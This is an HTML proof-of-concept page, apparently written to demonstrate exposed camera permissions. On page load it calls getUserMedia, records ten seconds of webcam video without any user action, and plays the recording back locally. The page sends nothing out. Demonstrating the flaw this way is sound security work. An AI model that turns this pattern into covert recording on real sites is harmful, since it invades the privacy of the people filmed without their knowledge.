<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>POC</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      background: #f9f9f9;
    }
    h2 {
      margin-bottom: 20px;
    }
    video {
      width: 360px;
      height: 270px;
      margin: 15px 0;
      border: 2px solid #444;
      border-radius: 6px;
      background: #000;
    }
  </style>
</head>
<body>
  <h2>Exposed mediaDevices.getUserMedia POC</h2>
  
  <video id="preview" autoplay playsinline></video>
  
  <video id="recorded" controls></video>

  <script>
    let mediaRecorder;
    let recordedChunks = [];

    async function autoRecord() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById('preview').srcObject = stream;

        mediaRecorder = new MediaRecorder(stream);

        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            recordedChunks.push(event.data);
          }
        };

        mediaRecorder.onstop = () => {
          const blob = new Blob(recordedChunks, { type: 'video/webm' });
          const videoURL = URL.createObjectURL(blob);
          document.getElementById('recorded').src = videoURL;
        };

        // Start recording immediately
        mediaRecorder.start();

        setTimeout(() => {
          if (mediaRecorder.state !== "inactive") {
            mediaRecorder.stop();
          }
        }, 10000);

      } catch (err) {
        alert("Camera access denied or not available: " + err);
      }
    }

    // Run on page load
    window.onload = autoRecord;
  </script>
</body>
</html>
